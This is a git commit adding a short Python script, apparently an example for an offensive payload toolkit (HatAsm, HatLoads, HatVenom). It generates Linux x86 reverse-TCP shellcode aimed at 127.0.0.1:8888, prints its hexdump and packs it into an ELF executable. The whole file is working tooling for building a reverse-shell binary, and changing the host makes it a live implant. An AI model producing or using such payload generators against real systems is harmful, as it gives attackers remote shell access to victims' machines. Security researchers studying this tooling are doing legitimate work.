28fda100f941eae134e2a5cc902c72cbb69cd46f
Ivan Nikolsky <enty8080@gmail.com>
2022-02-11 15:35:58 +0300

    Create elf_reverse_tcp.py

---
+++ shellcoding/elf_reverse_tcp.py
@@ -0,0 +1,24 @@
+#!/usr/bin/env python3
+
+from hatasm import HatAsm
+from hatloads import HatLoads
+from hatvenom import HatVenom
+
+hatasm = HatAsm()
+hatloads = HatLoads()
+hatvenom = HatVenom()
+
+options = {
+    'RHOST': '127.0.0.1',
+    'RPORT': 8888
+}
+
+print("[*] Assembling shellcode...")
+shellcode = hatloads.get_payload('linux', 'x86', 'shell_reverse_tcp', options)
+
+print("[i] Generated shellcode:")
+for line in hatasm.hexdump(shellcode):
+    print(line)
+
+print("[*] Writing shellcode to ELF...")
+hatvenom.generate_to('elf', 'x86', shellcode)
